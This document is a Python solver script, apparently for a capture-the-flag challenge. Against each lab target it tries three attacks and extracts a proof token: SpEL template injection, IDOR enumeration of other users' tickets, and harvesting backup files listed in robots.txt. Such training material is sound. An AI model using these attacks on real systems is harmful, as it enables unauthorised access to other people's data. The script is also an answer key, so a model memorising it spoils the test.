#!/usr/bin/env python3
"""Mastery solver for Template Temper: classifies each assigned target
independently (backup exposure / IDOR / SpEL template injection) and recovers
its proof.

Usage: python3 solve.py start.json
Prints {"proof-<n>": "<proof>", ...} as JSON on stdout.
"""
import html
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TIMEOUT = 20
PACE_S = 0.8


def get(url, cookiejar=None, timeout=TIMEOUT):
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8"})
    if cookiejar:
        req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookiejar.items()))
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        for c in resp.headers.get_all("Set-Cookie", []):
            if cookiejar is not None:
                name, _, rest = c.partition("=")
                cookiejar[name] = rest.split(";", 1)[0]
        return resp.status, resp.read().decode("utf-8", "replace")


def try_backup_exposure(base):
    try:
        status, robots = get(base + "robots.txt")
    except urllib.error.HTTPError:
        return None
    m = re.search(r"Disallow:\s*(\S+)", robots)
    if not m:
        return None
    disallowed = m.group(1)
    try:
        status, listing = get(base + disallowed.lstrip("/"))
    except urllib.error.HTTPError:
        return None
    files = re.findall(r'href="([^"]+\.(?:bak|json|txt|zip|tar\.gz))"', listing)
    for f in files:
        url = f if f.startswith("http") else base + f.lstrip("/")
        try:
            _, body = get(url)
        except urllib.error.HTTPError:
            continue
        m2 = re.search(r"proof_[0-9a-f]{20,}", body)
        if m2:
            return m2.group(0)
    return None


def try_idor(base):
    jar = {}
    try:
        get(base, cookiejar=jar)
        time.sleep(PACE_S)
        status, feed = get(base + "api/activity", cookiejar=jar)
    except urllib.error.HTTPError:
        return None
    try:
        data = json.loads(feed)
    except json.JSONDecodeError:
        return None
    mine = {e["case_id"] for e in data.get("events", []) if e.get("owner") == data.get("current_user")}
    foreign = [e["case_id"] for e in data.get("events", []) if e["case_id"] not in mine]
    for case_id in foreign:
        time.sleep(PACE_S)
        try:
            _, obj = get(base + f"api/tickets/{case_id}", cookiejar=jar)
        except urllib.error.HTTPError:
            continue
        m = re.search(r"proof_[0-9a-f]{20,}", obj)
        if m:
            return m.group(0)
    return None


def try_ssti(base):
    try:
        _, clues = get(base + "api/clues")
        clues = json.loads(clues)
    except (urllib.error.HTTPError, json.JSONDecodeError):
        return None
    route = clues.get("feature_route")
    if not route:
        return None
    qs = urllib.parse.urlencode({"template": "{{#objective}}"})
    time.sleep(PACE_S)
    try:
        _, body = get(base + route.lstrip("/") + "?" + qs)
    except urllib.error.HTTPError:
        return None
    m = re.search(r"<pre>(.*?)</pre>", body, re.S)
    if not m:
        return None
    text = html.unescape(m.group(1)).strip()
    return text or None


def recover(base_url):
    base = base_url.rstrip("/") + "/"
    for fn in (try_ssti, try_idor, try_backup_exposure):
        result = fn(base)
        if result:
            return result
        time.sleep(PACE_S)
    raise RuntimeError(f"could not classify/recover proof for {base_url}")


if __name__ == "__main__":
    start = json.load(open(sys.argv[1]))
    answers = {}
    for q in start["questions"]:
        target = next(t for t in start["targets"] if t["id"] == q["artifact"])
        answers[q["id"]] = recover(target["url"])
        time.sleep(PACE_S)
    print(json.dumps(answers))
